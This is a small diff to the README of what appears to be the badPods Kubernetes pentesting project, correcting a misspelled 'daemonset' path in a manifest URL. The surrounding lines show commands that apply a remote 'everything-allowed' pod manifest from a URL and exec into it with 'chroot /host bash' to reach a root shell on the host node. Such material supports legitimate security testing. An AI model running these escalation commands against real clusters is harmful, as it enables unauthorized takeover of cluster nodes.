@@ -63,7 +63,7 @@ kubectl exec -it everything-allowed-exec-replicationcontroller-[ID] -- chroot /h
 ```
 **DaemonSet**  
 ```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/deamonset/everything-allowed-exec-daemonset.yaml 
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/daemonset/everything-allowed-exec-daemonset.yaml 
 kubectl get pods | grep everything-allowed-exec-daemonset
 kubectl exec -it everything-allowed-exec-daemonset-[ID] -- chroot /host bash
 ```
